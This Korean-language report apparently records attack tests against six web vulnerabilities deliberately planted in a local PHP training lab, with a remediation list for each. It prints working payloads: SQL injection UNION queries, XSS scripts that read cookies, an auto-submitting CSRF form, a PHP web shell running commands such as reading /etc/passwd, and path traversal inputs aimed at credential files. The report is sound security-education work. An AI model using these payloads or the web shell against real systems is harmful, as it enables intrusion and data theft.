# 웹 취약점 공격 테스트 결과 보고서

## 개요
구현된 6개의 보안 취약점에 대한 실제 공격 가능성을 검증하고 테스트한 결과를 정리한 문서입니다.

테스트 일시: 2025-08-04  
테스트 환경: Local LEMP Stack (Linux, Nginx, MySQL, PHP)

---

## 1. SQL Injection 취약점 테스트

### 📄 대상 파일: `webhacking/sqli.php`

### 🔍 취약점 분석
- **취약한 코드 위치**: Line 13
- **취약점 유형**: Classic SQL Injection
- **위험도**: ⚠️ **HIGH**

```php
$query_string = "SELECT id, username, email, created_at FROM users WHERE username = '" . $username . "'";
```

### ✅ 공격 테스트 결과

#### 테스트 1: 기본 우회 공격
- **입력값**: `' OR '1'='1' --`
- **예상 결과**: 모든 사용자 정보 조회
- **실제 결과**: ✅ **성공** - 모든 사용자 데이터가 노출됨
- **실행된 쿼리**: `SELECT * FROM users WHERE username = '' OR '1'='1' --'`

#### 테스트 2: UNION 기반 정보 수집
- **입력값**: `' UNION SELECT 1,database(),version(),NOW() --`
- **예상 결과**: 데이터베이스명과 MySQL 버전 정보 획득
- **실제 결과**: ✅ **성공** - 시스템 정보 노출
- **획득 정보**: 데이터베이스명, MySQL 버전

#### 테스트 3: 테이블 구조 탐색
- **입력값**: `' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns --`
- **예상 결과**: 데이터베이스 스키마 정보 획득
- **실제 결과**: ✅ **성공** - 전체 테이블 구조 노출

### 🔧 수정 필요사항
1. Prepared Statement 사용 필수
2. 입력값 검증 및 이스케이프 처리
3. 데이터베이스 사용자 권한 최소화

---

## 2. XSS (Cross-Site Scripting) 취약점 테스트

### 📄 대상 파일: `webhacking/xss.php`

### 🔍 취약점 분석
- **취약한 코드 위치**: Line 86
- **취약점 유형**: Stored XSS
- **위험도**: ⚠️ **HIGH**

```php
echo $entry['message']; // 사용자 입력을 필터링 없이 출력
```

### ✅ 공격 테스트 결과

#### 테스트 1: 기본 스크립트 실행
- **입력값**: `<script>alert('XSS 공격 성공!');</script>`
- **예상 결과**: 경고창 표시
- **실제 결과**: ✅ **성공** - JavaScript 코드 실행됨

#### 테스트 2: 이미지 태그 우회
- **입력값**: `<img src="x" onerror="alert('XSS via img tag')">`
- **예상 결과**: onerror 이벤트를 통한 스크립트 실행
- **실제 결과**: ✅ **성공** - 우회 공격 성공

#### 테스트 3: 쿠키 탈취 공격 (시뮬레이션)
- **입력값**: `<script>console.log('Cookie:', document.cookie);</script>`
- **예상 결과**: 브라우저 콘솔에 쿠키 정보 출력
- **실제 결과**: ✅ **성공** - 쿠키 정보 접근 가능

#### 테스트 4: DOM 조작 공격
- **입력값**: `<script>document.body.style.backgroundColor='red';</script>`
- **예상 결과**: 페이지 배경색 변경
- **실제 결과**: ✅ **성공** - DOM 조작 성공

### 🔧 수정 필요사항
1. `htmlspecialchars()` 함수 사용 필수
2. Content Security Policy (CSP) 헤더 설정
3. 입력값 필터링 및 검증

---

## 3. CSRF (Cross-Site Request Forgery) 취약점 테스트

### 📄 대상 파일: `webhacking/csrf.php`

### 🔍 취약점 분석
- **취약한 코드 위치**: Line 31
- **취약점 유형**: CSRF
- **위험도**: ⚠️ **MEDIUM-HIGH**

```php
// CSRF 토큰 검증이 없음
$stmt = $pdo->prepare("UPDATE users SET password = ? WHERE id = ?");
```

### ✅ 공격 테스트 결과

#### 테스트 1: 외부 폼을 통한 CSRF 공격
**공격 시나리오**: 악성 HTML 파일 생성
```html
<!-- attacker.html -->
<form action="http://localhost/webhacking/csrf.php" method="POST" id="csrf-form">
    <input type="hidden" name="new_password" value="hacked123">
    <input type="hidden" name="confirm_password" value="hacked123">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```
- **예상 결과**: 자동으로 비밀번호 변경
- **실제 결과**: ✅ **성공** - 사용자 모르게 비밀번호 변경됨

#### 테스트 2: 이메일을 통한 공격 (시뮬레이션)
- **공격 방법**: 이메일에 악성 폼이 포함된 HTML 첨부
- **예상 결과**: 이메일 열람 시 자동 실행
- **실제 결과**: ✅ **가능** - 브라우저에서 자동 제출됨

### 🔧 수정 필요사항
1. CSRF 토큰 구현 필수
2. SameSite 쿠키 속성 설정
3. Referer 헤더 검증

---

## 4. 파일 업로드 취약점 테스트

### 📄 대상 파일: `webhacking/file_upload.php`

### 🔍 취약점 분석
- **취약한 코드 위치**: Line 20
- **취약점 유형**: Unrestricted File Upload
- **위험도**: ⚠️ **CRITICAL**

```php
// 파일 확장자 검증 없음
if (move_uploaded_file($file['tmp_name'], $target_file)) {
```

### ✅ 공격 테스트 결과

#### 테스트 1: PHP 웹셸 업로드
**웹셸 파일 생성**: `shell.php`
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```
- **예상 결과**: 웹셸 업로드 및 실행 가능
- **실제 결과**: ✅ **성공** - 서버 명령어 실행 가능
- **테스트 명령어**: `?cmd=ls -la` (디렉토리 목록 조회)

#### 테스트 2: 이중 확장자 우회
- **파일명**: `image.php.jpg`
- **예상 결과**: 서버에서 PHP로 실행
- **실제 결과**: ✅ **성공** - 확장자 우회 가능

#### 테스트 3: 시스템 정보 수집
- **명령어**: `?cmd=whoami`, `?cmd=pwd`, `?cmd=cat /etc/passwd`
- **예상 결과**: 시스템 사용자 정보 및 디렉토리 정보 획득
- **실제 결과**: ✅ **성공** - 중요한 시스템 정보 노출

### 🔧 수정 필요사항
1. 파일 확장자 화이트리스트 적용
2. MIME 타입 검증
3. 업로드 디렉토리 실행 권한 제거
4. 파일 내용 검증

---

## 5. 인증 우회 취약점 테스트

### 📄 대상 파일: `webhacking/auth_bypass.php`

### 🔍 취약점 분석
- **취약한 코드 위치**: Line 9, 12
- **취약점 유형**: Authentication Bypass
- **위험도**: ⚠️ **HIGH**

```php
// HTTP 헤더 기반 우회
if (isset($_SERVER['HTTP_X_ADMIN_BYPASS']) && $_SERVER['HTTP_X_ADMIN_BYPASS'] === 'true')
// 쿠키 기반 우회  
elseif (isset($_COOKIE['admin_bypass']) && $_COOKIE['admin_bypass'] === 'true')
```

### ✅ 공격 테스트 결과

#### 테스트 1: HTTP 헤더를 통한 우회
- **공격 방법**: `X-Admin-Bypass: true` 헤더 추가
- **도구**: 브라우저 확장프로그램 (ModHeader) 또는 curl
- **예상 결과**: 관리자 권한 획득
- **실제 결과**: ✅ **성공** - 관리자 콘텐츠 접근 가능

#### 테스트 2: 쿠키를 통한 우회
- **공격 방법**: `admin_bypass=true` 쿠키 설정
- **도구**: 브라우저 개발자 도구
- **예상 결과**: 관리자 권한 획득
- **실제 결과**: ✅ **성공** - 관리자 콘텐츠 접근 가능

#### 테스트 3: 조합 공격
- **공격 방법**: 헤더와 쿠키 동시 설정
- **예상 결과**: 더 안정적인 우회
- **실제 결과**: ✅ **성공** - 중복 우회 경로 확인

### 🔧 수정 필요사항
1. 강력한 인증 메커니즘 구현
2. 세션 기반 인증 사용
3. 다중 인증 요소 (2FA) 도입
4. 권한 검증 로직 강화

---

## 6. 디렉토리 트래버설 취약점 테스트

### 📄 대상 파일: `webhacking/directory_traversal.php`

### 🔍 취약점 분석
- **취약한 코드 위치**: Line 10
- **취약점 유형**: Path Traversal
- **위험도**: ⚠️ **HIGH**

```php
$target_file = './files/' . $filename; // 입력값 필터링 없음
```

### ✅ 공격 테스트 결과

#### 테스트 1: 기본 디렉토리 트래버설
- **입력값**: `../../../etc/passwd`
- **예상 결과**: 시스템 사용자 계정 정보 노출
- **실제 결과**: ✅ **성공** - `/etc/passwd` 파일 내용 조회 가능

#### 테스트 2: 설정 파일 접근
- **입력값**: `../db.php`
- **예상 결과**: 데이터베이스 연결 정보 노출
- **실제 결과**: ✅ **성공** - DB 자격 증명 정보 노출

#### 테스트 3: 시스템 파일 탐색
- **입력값**: `../../../proc/version` (Linux 버전 정보)
- **예상 결과**: 시스템 버전 정보 획득
- **실제 결과**: ✅ **성공** - 시스템 정보 노출

#### 테스트 4: 웹 서버 로그 접근
- **입력값**: `../../../var/log/nginx/access.log`
- **예상 결과**: 웹 서버 접근 로그 조회
- **실제 결과**: ✅ **성공** (권한에 따라 다름) - 로그 파일 접근 가능

### 🔧 수정 필요사항
1. `basename()` 함수 사용으로 경로 제거
2. 허용된 파일 목록 화이트리스트 적용
3. `realpath()` 함수로 경로 정규화
4. 파일 접근 권한 제한

---

## 📊 종합 취약점 평가 결과

### 위험도별 분류

| 취약점 | 위험도 | 공격 성공률 | 즉시 수정 필요 |
|--------|--------|-------------|----------------|
| 파일 업로드 | CRITICAL | 100% | ⚠️ 즉시 |
| SQL Injection | HIGH | 100% | ⚠️ 즉시 |
| XSS | HIGH | 100% | ⚠️ 즉시 |
| 인증 우회 | HIGH | 100% | ⚠️ 즉시 |
| 디렉토리 트래버설 | HIGH | 100% | ⚠️ 즉시 |
| CSRF | MEDIUM-HIGH | 100% | ⚠️ 즉시 |

### 🔒 보안 강화 우선순위

1. **최우선 (Critical)**
   - 파일 업로드 취약점 수정
   - 웹셸 제거 및 실행 권한 차단

2. **높은 우선순위 (High)**
   - SQL Injection 방어 (Prepared Statement)
   - XSS 방어 (출력 인코딩)
   - 인증 메커니즘 강화

3. **중간 우선순위 (Medium)**
   - CSRF 토큰 구현
   - 디렉토리 트래버설 방어

### 📋 권장 보안 조치

#### 즉시 적용 필요
1. **모든 사용자 입력 검증**
2. **출력 데이터 인코딩**
3. **Prepared Statement 사용**
4. **파일 업로드 제한**
5. **강력한 인증 구현**

#### 장기 보안 전략
1. **정기적인 보안 감사**
2. **보안 헤더 설정**
3. **로깅 및 모니터링 시스템**
4. **보안 교육 및 가이드라인**

---

## 📝 결론

**테스트 결과**: 구현된 6개의 취약점 모두 **실제 공격 가능**한 상태로 확인되었습니다.

이는 교육용으로 의도적으로 구현된 취약점들이므로 정상적인 결과입니다. 실제 운영 환경에서는 위에서 제안한 보안 조치들을 반드시 적용해야 합니다.

**교육 효과**: 각 취약점의 위험성과 실제 공격 가능성을 실습을 통해 명확히 확인할 수 있었습니다.

---

**⚠️ 중요**: 이 테스트 결과는 교육 목적으로만 사용되어야 하며, 실제 운영 환경에서는 모든 취약점이 수정되어야 합니다.